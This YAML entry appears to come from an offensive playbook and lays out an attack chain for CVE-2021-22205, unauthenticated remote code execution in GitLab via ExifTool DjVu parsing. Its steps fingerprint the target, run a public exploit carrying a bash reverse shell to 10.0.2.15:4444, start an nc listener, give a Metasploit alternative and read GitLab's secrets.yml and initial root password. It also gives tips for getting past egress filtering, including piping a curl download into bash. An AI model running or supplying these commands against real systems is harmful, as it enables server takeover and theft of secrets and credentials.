chain_id: gitlab_exiftool_cve_2021_22205
title: "GitLab — CVE-2021-22205 unauth RCE via ExifTool DjVu"
severity: CRITICAL
tags: [web, gitlab, cve-2021-22205, exiftool, djvu, rce]

trigger:
  any_of:
    - { kind: "CVE-2021-22205" }
    - { banner_pattern: "(?i)gitlab" }
    - { product_pattern: "(?i)gitlab" }
    - { path_pattern: "(?i)/users/sign_in|/uploads/user" }

description: |
  GitLab CE/EE 11.9 → 13.10.2 / 13.9.5 / 13.8.7 pipes uploaded images
  through ExifTool, which mishandles a malformed DjVu annotation and
  evaluates Perl. The endpoint is unauthenticated in 13.10.2 and
  earlier (you can hit `/uploads/user` without a session). RCE runs as
  the `git` user. CISA top-exploited 2021–2022.

steps:
  - id: 1
    title: "Fingerprint the version"
    command: |
      curl -sk "https://$VICTIMA/help" | grep -Eo 'GitLab (Community|Enterprise) Edition [0-9.]+'
      curl -sk "https://$VICTIMA/api/v4/version"

  - id: 2
    title: "Build the malicious DjVu image (one-liner generator)"
    command: |
      git clone https://github.com/Al1ex/CVE-2021-22205 /tmp/cve22205
      cd /tmp/cve22205 && python3 CVE-2021-22205.py --target $VICTIMA \
        --command 'bash -c "bash -i >& /dev/tcp/10.0.2.15/4444 0>&1"'

  - id: 3
    title: "Listener"
    command: nc -lvnp 4444

  - id: 4
    title: "Or with Metasploit"
    command: |
      msfconsole -qx 'use exploit/multi/http/gitlab_exif_rce; \
        set RHOSTS $VICTIMA; set SSL true; set RPORT 443; \
        set LHOST 10.0.2.15; set LPORT 4444; run'

  - id: 5
    title: "Post: dump the secrets file (signs JWTs, encrypts tokens)"
    command: |
      cat /var/opt/gitlab/gitlab-rails/etc/secrets.yml
      cat /etc/gitlab/initial_root_password 2>/dev/null

common_errors:
  - error: "422 / 500 on upload but no callback"
    solution: |
      Patched build. Confirm with `/api/v4/version`. If ≥13.10.3 fall
      back to authenticated paths (group webhook SSRF, project import
      RCEs).
  - error: "Webhook fires but no shell"
    solution: |
      Egress filtering. Try a TCP listener on 443/80 instead of 4444,
      or stage via HTTP (`curl … | bash`).

references:
  - https://nvd.nist.gov/vuln/detail/CVE-2021-22205
  - https://about.gitlab.com/releases/2021/04/14/security-release-gitlab-13-10-3-released/
